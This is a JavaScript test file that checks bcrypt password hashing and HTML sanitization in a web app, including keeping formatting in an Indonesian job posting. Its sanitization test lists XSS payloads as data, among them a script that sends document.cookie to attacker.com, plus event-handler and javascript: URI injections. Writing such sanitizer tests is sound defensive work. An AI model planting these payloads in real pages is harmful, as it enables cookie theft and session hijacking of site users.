import { describe, it } from "node:test";
import assert from "node:assert/strict";
import bcrypt from "bcryptjs";
import DOMPurify from "../../src/lib/sanitize";

describe("8. Security & Cryptography Standards", () => {
  describe("Password Hashing & Verification (bcryptjs)", () => {
    it("should generate standard salted hash and verify correct password", async () => {
      const plainPassword = "SuperAdminPassword2026!";
      const salt = await bcrypt.genSalt(10);
      const hash = await bcrypt.hash(plainPassword, salt);

      assert.notStrictEqual(hash, plainPassword);
      assert.ok(hash.startsWith("$2a$") || hash.startsWith("$2b$") || hash.startsWith("$2y$"));

      const isMatch = await bcrypt.compare(plainPassword, hash);
      assert.strictEqual(isMatch, true);
    });

    it("should reject incorrect password attempts against stored hash", async () => {
      const correctPassword = "CorrectCompanySecret";
      const wrongPassword = "WrongPasswordAttempt";

      const hash = await bcrypt.hash(correctPassword, 10);
      const isMatch = await bcrypt.compare(wrongPassword, hash);

      assert.strictEqual(isMatch, false);
    });
  });

  describe("Injection & Payload Sanitization", () => {
    it("should strip malicious script tags and inline handlers", () => {
      const maliciousPayloads = [
        '<script>document.location="http://attacker.com?c="+document.cookie</script>',
        '<b onmouseover=alert("xss")>Hover Me</b>',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<svg onload=alert(1)>',
      ];

      for (const payload of maliciousPayloads) {
        const sanitized = DOMPurify.sanitize(payload);
        assert.strictEqual(sanitized.includes("<script>"), false);
        assert.strictEqual(sanitized.includes("onmouseover"), false);
        assert.strictEqual(sanitized.includes("javascript:"), false);
        assert.strictEqual(sanitized.includes("onload"), false);
      }
    });

    it("should preserve legitimate markdown / bold / list formatting safely", () => {
      const safeText = "Persyaratan: <b>Minimal SMA</b>, bersedia ditempatkan di <i>Timika</i>.";
      const sanitized = DOMPurify.sanitize(safeText);
      assert.ok(sanitized.includes("<b>Minimal SMA</b>"));
      assert.ok(sanitized.includes("<i>Timika</i>"));
    });
  });
});
